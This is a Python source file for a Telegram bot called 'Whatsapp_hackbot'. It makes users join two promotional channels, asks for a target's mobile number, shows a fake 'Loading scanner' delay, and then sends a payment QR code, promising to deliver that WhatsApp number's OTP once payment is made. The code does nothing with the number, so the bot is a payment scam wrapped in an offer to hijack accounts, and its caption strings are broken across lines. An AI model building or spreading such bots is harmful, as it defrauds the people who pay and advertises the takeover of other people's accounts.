import os
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardRemove
import asyncio

api_id = int(os.getenv("API_ID"))
api_hash = os.getenv("API_HASH")
bot_token = os.getenv("BOT_TOKEN")

FORCE_CHANNELS = ["@askingearn", "@technostellar_official"]

app = Client("Whatsapp_hackbot", api_id=api_id, api_hash=api_hash, bot_token=bot_token)

user_step = {}

async def check(user_id):
    for ch in FORCE_CHANNELS:
        try:
            member = await app.get_chat_member(ch, user_id)
            if member.status in ("left", "kicked"):
                return False
        except:
            return False
    return True

@app.on_message(filters.command("start"))
async def start(_, msg):
    uid = msg.from_user.id
    if await check(uid):
        await msg.reply_text("✅ Channels Joined!\n\n👉 Enter mobile number:", reply_markup=ReplyKeyboardRemove())
        user_step[uid] = "ask_number"
    else:
        btn = [[InlineKeyboardButton(f"Join {ch}", url=f"https://t.me/{ch.replace('@','')}")] for ch in FORCE_CHANNELS]
        btn.append([InlineKeyboardButton("Refresh ✅", callback_data="refresh")])
        await msg.reply("⚠️ Please join required channels:", reply_markup=InlineKeyboardMarkup(btn))

@app.on_callback_query(filters.regex("refresh"))
async def ref(_, cq):
    uid = cq.from_user.id
    if await check(uid):
        await cq.edit_message_text("✅ Joined!\n\n👉 Enter mobile number:")
        user_step[uid] = "ask_number"
    else:
        await cq.answer("Still not joined!", show_alert=True)

@app.on_message(filters.text)
async def collect(_, msg):
    uid = msg.from_user.id
    if user_step.get(uid) == "ask_number":
        number = msg.text
        await msg.reply("🔃 Loading scanner...")
        await asyncio.sleep(3)
        await msg.reply_photo(
            photo="https://img.eselt.de/img/18260743_hZWZIBi5U8fPvWAJ/ad.jpg",
            caption=(
                "Captain rahi

"
                "SCAN THIS QR TO ANY PAYMENT APP

"
                "PAY AND SEND SCREENSHOT TO BOT.
"
                "WHEN BOT CONFIRMS THAT PAYMENT IS RECEIVED, IT WILL AUTOMATICALLY PROVIDE THE WHATSAPP NUMBER OTP."
            )
        )
        user_step.pop(uid, None)

app.run()
